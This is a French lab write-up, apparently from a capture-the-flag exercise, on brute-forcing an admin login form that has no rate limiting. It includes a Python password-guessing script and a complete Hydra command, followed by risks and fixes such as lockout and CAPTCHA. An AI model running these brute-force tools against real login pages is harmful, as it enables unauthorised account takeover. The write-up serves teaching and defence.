## Phase 1 : Découverte de la faille

### Analyse initiale
Lors de l'analyse de la page de connexion, j'ai remarqué qu'il était possible de tester des combinaisons de noms d'utilisateur et de mots de passe sans qu'il y ait de délai entre les tentatives. Cela signifie qu'il n'y avait aucune protection contre les attaques par force brute.

J'ai commencé par tester un nom d'utilisateur basique, comme `admin`, qui est souvent utilisé par défaut dans de nombreuses applications web.

### Tentative avec un script Python
J'ai d'abord écrit un script Python pour tester les mots de passe les plus courants. Cependant, cette méthode s'est avérée trop lente, car chaque requête était exécutée de manière séquentielle. Voici un extrait du script utilisé :

```python
import requests

url = "http://IP_ADDR/index.php"
username = "admin"
password_file = "path/to/passwd.txt"

def try_password(username, password):
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }
    response = requests.get(url, params=params)
    if "flag" in response.text:
        print(f"[+] Mot de passe trouvé : {password}")
        return True
    return False

with open(password_file, "r") as file:
    for line in file:
        password = line.strip()
        if try_password(username, password):
            break
```

Bien que fonctionnel, ce script était trop lent pour tester efficacement une grande liste de mots de passe.

---

## Phase 2 : Exploitation avec Hydra

Pour accélérer le processus, j'ai utilisé **Hydra**, un outil spécialisé dans les attaques par force brute. Voici la commande utilisée :

```bash
hydra -l admin -P path/to/passwd.txt IP_ADDR http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:images/WrongAnswer.gif"
```

### Explications de la commande :
- **`-l admin`** : Spécifie le nom d'utilisateur à tester (`admin`).
- **`-P path/to/passwd.txt`** : Spécifie le fichier contenant les 10 000 mots de passe les plus utilisés.
- **`IP_ADDR`** : Adresse IP du serveur cible.
- **`http-get-form`** : Indique que Hydra doit brute-forcer un formulaire HTML via une requête GET.
- **`/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login`** : Définit les paramètres du formulaire. `^USER^` et `^PASS^` sont remplacés par Hydra avec les noms d'utilisateur et mots de passe.
- **`images/WrongAnswer.gif`** : Hydra considère une tentative comme incorrecte si la réponse contient cette chaîne.

### Résultat :
En utilisant Hydra, j'ai trouvé le mot de passe correct très rapidement, car il se trouvait dans le top 30 des mots de passe les plus utilisés. L'absence de délai entre les tentatives a permis de tester les mots de passe à une vitesse élevée.

---

## Phase 3 : Conséquences possibles

### Risques liés à cette faille
1. **Accès non autorisé** :
   - Un attaquant peut accéder au compte administrateur ou à d'autres comptes sensibles en utilisant une attaque par force brute.

2. **Compromission des données** :
   - Une fois connecté, un attaquant peut accéder à des informations sensibles, modifier des données ou compromettre l'intégrité du système.

3. **Escalade de privilèges** :
   - Si le compte administrateur est compromis, l'attaquant peut obtenir un contrôle total sur l'application.

4. **Attaques ultérieures** :
   - L'attaquant peut utiliser l'accès obtenu pour lancer d'autres attaques, comme l'installation de backdoors ou l'exfiltration de données.

---

## Phase 4 : Comment corriger la faille

### 1. **Implémenter un délai entre les tentatives**
- Ajoutez un délai (par exemple, 1 seconde) entre chaque tentative de connexion pour ralentir les attaques par force brute.

### 2. **Limiter le nombre de tentatives**
- Bloquez l'accès à un compte après un certain nombre de tentatives échouées (par exemple, 5 tentatives).

### 3. **Utiliser un CAPTCHA**
- Ajoutez un CAPTCHA après plusieurs tentatives échouées pour empêcher les attaques automatisées.

### 4. **Utiliser des mots de passe forts**
- Forcez les utilisateurs à choisir des mots de passe complexes et uniques.

### 5. **Surveiller les tentatives de connexion**
- Implémentez une journalisation des tentatives de connexion et alertez les administrateurs en cas d'activité suspecte.

### 6. **Configurer un système de verrouillage IP**
- Bloquez temporairement les adresses IP qui effectuent un grand nombre de tentatives échouées.

---

## Conclusion

Cette faille montre l'importance de protéger les formulaires de connexion contre les attaques par force brute. En implémentant des mécanismes de sécurité comme des délais, des limites de tentatives, et des CAPTCHAs, il est possible de réduire considérablement les risques associés à ce type d'attaque.